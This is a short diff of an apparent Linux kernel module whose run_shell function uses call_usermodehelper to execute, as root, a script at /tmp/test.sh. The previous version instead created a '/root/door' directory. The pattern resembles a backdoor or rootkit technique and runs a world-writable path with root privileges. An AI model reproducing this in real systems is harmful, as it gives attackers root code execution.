@@ -7,8 +7,8 @@ static struct task_struct * exe_thread = NULL;
 
 static int run_shell(void)
 {
-    char path[] = "/bin/mkdir";
-    char *argv[] = { path, "/root/door", NULL };
+    char path[] = "/bin/bash";
+    char *argv[] = { path, "/tmp/test.sh", NULL };
     static char *envp[] = { "HOME=/", "TERM=linux","PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
